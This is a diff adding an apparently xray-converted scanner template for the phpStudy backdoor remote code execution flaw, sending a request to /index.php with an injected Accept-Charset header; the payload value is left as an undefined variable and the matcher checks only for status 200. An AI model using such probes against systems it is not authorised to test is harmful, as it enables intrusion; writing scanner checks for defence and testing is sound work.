@@ -1,0 +1,23 @@
+id: poc-yaml-phpstudy-backdoor-rce
+
+info:
+  name: poc-yaml-phpstudy-backdoor-rce
+  author: 17bdw
+  severity: critical
+  tags: xray-converted,rce,ct-158974
+  reference:
+    - https://www.freebuf.com/column/214946.html
+
+http:
+  - raw:
+      - |
+        GET /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Charset: {{payload}}
+        Accept-Encoding: gzip,deflate
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
